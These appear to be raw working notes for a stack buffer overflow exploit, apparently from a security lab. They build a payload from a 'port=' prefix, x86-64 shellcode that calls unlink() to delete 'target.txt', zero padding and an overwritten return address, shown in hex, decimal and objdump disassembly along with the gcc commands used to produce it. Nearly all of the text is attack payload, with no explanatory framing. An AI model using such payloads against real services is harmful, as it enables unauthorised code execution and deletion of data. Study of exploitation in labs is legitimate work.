70:6f:72:74:3d:00:00:00:55:48:89:e5:48:83:ec:10:48:b8:64:65:6c:65:74:65:2e:74:48:89:45:f0:66:c7:45:f8:78:74:c6:45:fa:00:48:8d:45:f0:48:89:c7:e8:00:00:00:00:b8:00:00:00:00:c9:c3

//00 00 00 48 83 ec 18 48 b8 64 65 6c 65 74 65 2e 74 48 89 04 24 48 89 e7 b8 78 74 00 00 66 89 44 24 08 c6 44 24 0a 00 e8 00 00 00 00 31 c0 48 83 c4 18 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 cf ff ff ff 7f



***
("port=") (8) (+3 offset?)
70 6f 72 74 3d 00 00 00
(code) (51)
55 48 89 e5 48 83 ec 10 48 b8 74 61 72 67 65 74 2e 74 48 89 45 f0 66 c7 45 f8 78 74 c6 45 fa 00 48 8d 45 f0 48 89 c7 e8 00 00 00 00 b8 00 00 00 00 c9 c3

(56)
55 48 89 e5 48 83 ec 10 48 b8 74 61 72 67 65 74 2e 74 48 89 45 f0 66 c7 45 f8 78 74 c6 45 fa 00 48 8d 45 f0 48 89 c7 b8 00 00 00 00 e8 00 00 00 00 b8 00 00 00 00 c9 c3

(padding) (88) (-3 offset?)
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
(return address) (8)
58 cf ff ff ff 7f 00 00
***

>>70 6f 72 74 3d 00 00 00 55 48 89 e5 48 83 ec 10 48 b8 74 61 72 67 65 74 2e 74 48 89 45 f0 66 c7 45 f8 78 74 c6 45 fa 00 48 8d 45 f0 48 89 c7 b8 00 00 00 00 e8 00 00 00 00 b8 00 00 00 00 c9 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 58 cf ff ff ff 7f 00 00

>112 111 114 116 61 0 0 0 85 72 137 229 72 131 236 16 72 184 116 97 114 103 101 116 46 116 72 137 69 240 102 199 69 248 120 116 198 69 250 0 72 141 69 240 72 137 199 184 0 0 0 0 232 0 0 0 0 184 0 0 0 0 201 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 88 207 255 255 255 127 0 0

70 6f 72 74 3d 00 00 00 55 48 89 e5 48 83 ec 10 48 b8 74 61 72 67 65 74 2e 74 48 89 45 f0 66 c7 45 f8 78 74 c6 45 fa 00 48 8d 45 f0 48 89 c7 e8 00 00 00 00 b8 00 00 00 00 c9 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 58 cf ff ff ff 7f 00 00




	.cfi_def_cfa_offset 24

	.cfi_offset 12, -24

	pushq	%rbp

	.cfi_def_cfa_offset 32

	.cfi_offset 6, -32

	pushq	%rbx

	.cfi_def_cfa_offset 40

	.cfi_offset 3, -40

	movq	%rdi, %rbx

	subq	$120, %rsp

	.cfi_def_cfa_offset 160


gcc -c unlink.c
gcc -S unlink.c
objdump -d -M intel -S unlink.o




Disassembly of section .text:

0000000000000000 <main>:
   0:   55                      push   %rbp
   1:   48 89 e5                mov    %rsp,%rbp
   4:   48 83 ec 10             sub    $0x10,%rsp
   8:   48 b8 74 61 72 67 65    movabs $0x742e746567726174,%rax
   f:   74 2e 74
  12:   48 89 45 f0             mov    %rax,-0x10(%rbp)
  16:   66 c7 45 f8 78 74       movw   $0x7478,-0x8(%rbp)
  1c:   c6 45 fa 00             movb   $0x0,-0x6(%rbp)
  20:   48 8d 45 f0             lea    -0x10(%rbp),%rax
  24:   48 89 c7                mov    %rax,%rdi
  27:   e8 00 00 00 00          callq  2c <main+0x2c>
  2c:   b8 00 00 00 00          mov    $0x0,%eax
  31:   c9                      leaveq
  32:   c3                      retq


0000000000000000 <main>:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 10             sub    rsp,0x10
   8:   48 b8 74 61 72 67 65    movabs rax,0x742e746567726174
   f:   74 2e 74
  12:   48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
  16:   66 c7 45 f8 78 74       mov    WORD PTR [rbp-0x8],0x7478
  1c:   c6 45 fa 00             mov    BYTE PTR [rbp-0x6],0x0
  20:   48 8d 45 f0             lea    rax,[rbp-0x10]
  24:   48 89 c7                mov    rdi,rax
  27:   b8 00 00 00 00          mov    eax,0x0
  2c:   e8 00 00 00 00          call   31 <main+0x31>
  31:   b8 00 00 00 00          mov    eax,0x0
  36:   c9                      leave
  37:   c3                      ret






	.file	"unlink.c"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movabsq	$8371756736204398964, %rax
	movq	%rax, -16(%rbp)
	movw	$29816, -8(%rbp)
	movb	$0, -6(%rbp)
	leaq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	unlink
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
	.ident	"GCC: (GNU) 6.3.0"
	.section	.note.GNU-stack,"",@progbits












